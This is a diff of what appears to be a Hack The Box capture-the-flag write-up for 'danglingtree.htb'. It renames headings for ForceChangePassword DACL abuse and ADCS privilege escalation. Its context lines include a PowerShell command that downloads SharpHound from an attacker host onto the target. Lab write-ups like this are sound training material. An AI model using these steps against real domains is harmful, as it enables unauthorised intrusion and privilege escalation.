@@ -685,7 +685,7 @@ SMB         10.129.10.114   445    DC               [+] danglingtree.htb\alex.o:
 
 cant get shell as alex.o
 
-#### alex.o to jake.h (ForceChangePassword)
+#### alex.o to jake.h DACL Abuse (ForceChangePassword)
 
 ```
 PS C:\Users\noah.b\Documents> Invoke-WebRequest http://10.10.14.183:8888/sharphound.exe -UseBasicParsing -OutFile sharphound.exe
@@ -728,7 +728,7 @@ PS C:\Users\jake.h\Documents> whoami
 danglingtree\jake.h
 ```
 
-### ADCS To Administrator + root flag
+### ADCS Abuse Privesc to Administrator + root flag
 
 ```
 ┌──(blackcat㉿threatactor)-[~/Desktop/danglingtree-htb]
